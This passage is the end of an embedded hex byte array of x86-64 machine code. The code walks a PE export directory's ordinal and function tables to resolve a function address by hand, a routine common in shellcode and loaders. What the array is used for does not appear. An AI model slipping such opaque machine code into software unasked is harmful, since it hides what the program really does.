0x0D, 0xFF, 0xC1, 0x41, 0x3B, 0x4A, 0x18, 0x72, 0xD1, 0xE9, 0x5B, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x42, 0x24, 0x03, 0xC9, 0x49, 0x03, 0xC0, 0x0F, 0xB7, 0x14, 0x01, 0x41, 0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC8, 0x8B, 0x04, 0x91, 0x49, 0x03, 0xC0, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x10, 0x5F, 0xC3}
)
